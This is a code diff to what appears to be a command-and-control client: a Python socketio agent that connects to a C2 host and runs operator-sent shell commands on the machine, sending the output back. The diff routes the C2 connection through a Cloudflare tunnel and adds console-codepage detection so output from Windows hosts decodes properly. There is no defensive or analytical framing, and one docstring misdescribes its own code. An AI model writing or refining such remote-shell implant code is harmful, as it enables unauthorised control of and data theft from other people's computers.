@@ -1,10 +1,21 @@
-import subprocess
+import subprocess 
 import threading
 import socketio
 import time
 from config import C2_HOST, C2_PORT, MACHINE_ID
+C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 
-C2_URL = f"{C2_HOST}:{C2_PORT}"
+# get the console encoding
+def get_console_encoding():
+    """Read the active OEM codepage from the system registry."""
+    result = subprocess.run("chcp", shell=True, capture_output=True, text=True, encoding="ascii")
+    # output is like "Active code page: 862"
+    try:
+        return "cp" + result.stdout.strip().split(": ")[1]
+    except:
+        return "cp850"  # safe fallback
+
+CONSOLE_ENCODING = get_console_encoding()
 
 def make_client():
     """Create a fresh socketio client with event handlers registered."""
@@ -24,7 +35,9 @@ def make_client():
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=10
+                timeout=10,
+                encoding=CONSOLE_ENCODING,
+                errors="replace"
             )
             output = result.stdout + result.stderr
         except subprocess.TimeoutExpired:
